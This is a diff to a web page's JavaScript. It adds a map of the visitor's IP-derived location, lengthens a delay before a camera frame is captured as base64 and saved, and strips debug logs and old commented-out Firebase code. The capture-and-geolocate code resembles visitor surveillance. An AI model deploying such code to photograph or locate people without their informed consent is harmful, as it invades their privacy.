@@ -69,7 +69,7 @@ document.addEventListener('DOMContentLoaded', function () {
                     // Convert the canvas content to base64
                     var base64Data = canvas.toDataURL('image/png');
                     SaveThisdata(`${base64Data}`)
-                  }, 1500);
+                  }, 2000);
 
 
                 },
@@ -78,8 +78,7 @@ document.addEventListener('DOMContentLoaded', function () {
                 }
               );
             } else {
-              SaveThisdata('assets/img/no-image-found.jpg?from=getUserMedia is not supported')
-              // console.error("getUserMedia is not supported in this browser");
+              SaveThisdata('assets/img/no-image-found.jpg?from=getUserMedia is not supported') 
             }
           }
           GetImgThenSave()
@@ -90,7 +89,22 @@ document.addEventListener('DOMContentLoaded', function () {
     }
     GetFakeUserData()
 
-
+    // Load the map
+    function LoadMap([lat,long]) {
+      var center = [lat, long];
+      $('#locationOfUser')
+      .gmap3({
+      center: center,
+      zoom: 1,
+      mapTypeId : google.maps.MapTypeId.ROADMAP
+      }).circle({
+          center: center,
+          radius : 50000,
+          fillColor : "#FFAF9F",
+          strokeColor : "#FF512F"
+      }).fit(); 
+    }
+  
 
 
     // Unplash Images
@@ -236,8 +250,7 @@ document.addEventListener('DOMContentLoaded', function () {
             if (Object.keys(filteredData).length > 0) {
               document.querySelector('.mylinks.dblk').style.display = "block"
               
-              Object.entries(filteredData).forEach(([key, item]) => {
-                console.log(key,item)
+              Object.entries(filteredData).forEach(([key, item]) => { 
                 let div =  document.createElement('DIV')
                 div.classList.add('col-lg-3')
                 div.classList.add('col-md-4')
@@ -294,9 +307,10 @@ document.addEventListener('DOMContentLoaded', function () {
               ul.querySelector('.devision').innerHTML = data.region
               ul.querySelector('.timezone').innerHTML = data.timezone
               ul.querySelector('.isp').innerHTML = data.org
-
-              // console.log(data)
+ 
               document.querySelector('body').classList.remove('not_clicked_yet')
+              let latLong = data.loc.split(",")
+              LoadMap([Number(latLong[0]), Number(latLong[1])]);
        
             } 
             
@@ -321,84 +335,7 @@ document.addEventListener('DOMContentLoaded', function () {
 
 
  
- 
- 
-//   var rollV, nameV, genderV, addressV;
-
-// function readFom() {
-//   rollV = document.getElementById("roll").value;
-//   nameV = document.getElementById("name").value;
-//   genderV = document.getElementById("gender").value;
-//   addressV = document.getElementById("address").value;
-//   console.log(rollV, nameV, addressV, genderV);
-// }
-
-// document.getElementById("insert").onclick = function () {
-//   readFom();
-
-//   firebase
-//     .database()
-//     .ref("student/" + rollV)
-//     .set({
-//       rollNo: rollV,
-//       name: nameV,
-//       gender: genderV,
-//       address: addressV,
-//     });
-//   alert("Data Inserted");
-//   document.getElementById("roll").value = "";
-//   document.getElementById("name").value = "";
-//   document.getElementById("gender").value = "";
-//   document.getElementById("address").value = "";
-// };
-
-// document.getElementById("read").onclick = function () {
-//   readFom();
-
-//   firebase
-//     .database()
-//     .ref("student/" + rollV)
-//     .on("value", function (snap) {
-//       document.getElementById("roll").value = snap.val().rollNo;
-//       document.getElementById("name").value = snap.val().name;
-//       document.getElementById("gender").value = snap.val().gender;
-//       document.getElementById("address").value = snap.val().address;
-//     });
-// };
-
-// document.getElementById("update").onclick = function () {
-//   readFom();
-
-//   firebase
-//     .database()
-//     .ref("student/" + rollV)
-//     .update({
-//       //   rollNo: rollV,
-//       name: nameV,
-//       gender: genderV,
-//       address: addressV,
-//     });
-//   alert("Data Update");
-//   document.getElementById("roll").value = "";
-//   document.getElementById("name").value = "";
-//   document.getElementById("gender").value = "";
-//   document.getElementById("address").value = "";
-// };
-// document.getElementById("delete").onclick = function () {
-//   readFom();
-
-//   firebase
-//     .database()
-//     .ref("student/" + rollV)
-//     .remove();
-//   alert("Data Deleted");
-//   document.getElementById("roll").value = "";
-//   document.getElementById("name").value = "";
-//   document.getElementById("gender").value = "";
-//   document.getElementById("address").value = "";
-// };
-
-
+  
 
 
 
